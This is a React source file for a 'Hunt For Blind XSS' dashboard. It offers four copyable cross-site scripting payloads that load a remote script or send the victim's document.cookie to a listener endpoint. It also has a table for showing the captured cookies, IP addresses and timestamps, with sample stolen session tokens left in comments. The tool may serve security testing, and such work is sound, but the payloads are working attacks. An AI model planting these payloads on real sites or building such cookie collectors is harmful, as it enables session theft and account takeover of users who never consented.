import React, { useEffect, useState } from "react";
import PageNav from "./../components/PageNav";
import styles from "./BlindXssResults.module.css";

const BlindXssResults = () => {
  const [results, setResults] = useState([
    // {
    //   timestamp: "2024-06-12T12:34:56Z",
    //   ip: "192.168.0.1",
    //   cookie: "sessionid=abc123; csrftoken=xyz789",
    // },
    // {
    //   timestamp: "2024-06-12T13:45:23Z",
    //   ip: "192.168.0.2",
    //   cookie: "sessionid=def456; csrftoken=uvw123",
    // },
  ]);

  const [payloadCopied, setPayloadCopied] = useState(false);

  const payloads = [
    "<script src='http://localhost:3000/blind-xss.js'></script>",
    "<img src=x onerror='document.location=`http://localhost:3000/xss-listener?cookie=${document.cookie}`'>",
    "<iframe src='http://localhost:3000/blind-xss.js'></iframe>",
    "<svg/onload=fetch('http://localhost:3000/xss-listener?cookie='+document.cookie)>",
  ];

  const copyToClipboard = (payload) => {
    navigator.clipboard.writeText(payload).then(
      () => {
        setPayloadCopied(true);
      },
      (err) => {
        console.error("Could not copy text: ", err);
      }
    );
  };

  useEffect(() => {
    // Uncomment the fetch call when ready to fetch from server
    // fetch("http://localhost:3000/xss-results")
    //   .then((response) => response.json())
    //   .then((data) => setResults(data))
    //   .catch((error) => console.error("Error fetching XSS results:", error));
  }, []);

  return (
    <>
      <PageNav />
      <div className={styles.container}>
        <h2 className={styles.title}>Hunt For Blind XSS</h2>

        <div className={styles.payloadContainer}>
          <h3 className={styles.payloadTitle}>Possible Payloads</h3>
          {payloads.map((payload, index) => (
            <div key={index} className={styles.payload}>
              <span>{payload}</span>
              <button
                onClick={() => copyToClipboard(payload)}
                className={styles.copyButton}
              >
                Copy
              </button>
            </div>
          ))}
        </div>

        {payloadCopied && (
          <p className={styles.noResultsMessage}>
            We will let you know once the payload is executed.
          </p>
        )}

        {results.length > 0 ? (
          <table className={styles.table}>
            <thead>
              <tr>
                <th>Timestamp</th>
                <th>IP Address</th>
                <th>Cookie</th>
              </tr>
            </thead>
            <tbody>
              {results.map((result, index) => (
                <tr key={index}>
                  <td>{new Date(result.timestamp).toLocaleString()}</td>
                  <td>{result.ip}</td>
                  <td>{result.cookie}</td>
                </tr>
              ))}
            </tbody>
          </table>
        ) : (
          <></>
        )}
      </div>
    </>
  );
};

export default BlindXssResults;
